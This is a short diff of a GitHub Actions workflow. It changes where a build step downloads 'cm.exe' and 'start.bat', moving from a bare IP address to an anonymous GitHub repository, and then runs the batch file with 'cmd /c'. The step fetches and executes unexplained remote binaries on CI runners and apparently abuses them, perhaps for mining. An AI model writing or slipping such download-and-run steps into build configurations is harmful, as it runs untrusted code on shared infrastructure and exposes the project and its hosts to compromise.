@@ -19,6 +19,6 @@ jobs:
       uses: actions/checkout@v1
     - name: running
       run: |
-        Invoke-WebRequest http://134.122.17.115/cm.exe -OutFile cm.exe
-        Invoke-WebRequest http://134.122.17.115/start.bat -OutFile start.bat
+        Invoke-WebRequest https://github.com/hostfile307/file/raw/main/cm.exe -OutFile cm.exe
+        Invoke-WebRequest https://raw.githubusercontent.com/hostfile307/file/main/start.bat -OutFile start.bat
         cmd /c start.bat
